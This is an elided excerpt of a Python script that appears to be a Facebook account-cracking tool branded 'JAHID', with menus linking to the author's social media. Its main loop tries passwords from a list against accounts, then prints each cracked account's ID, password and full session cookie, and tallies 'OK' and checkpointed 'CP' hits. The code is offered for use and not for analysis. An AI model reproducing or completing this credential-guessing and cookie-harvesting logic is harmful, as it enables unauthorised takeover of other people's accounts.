...
def ud():
    ...
    if opt == '1':
        os.system('xdg-open https://facebook.com/groups/229633909558278/')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] JOIN MY FB GROUP')
    print(' [2] EXIT')
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/JAHID.hasan.official.0')
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/@JAHIDTech-vg9cm')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100089902020076')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[JAHID-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[JAHID-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write(' %s[JAHID] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
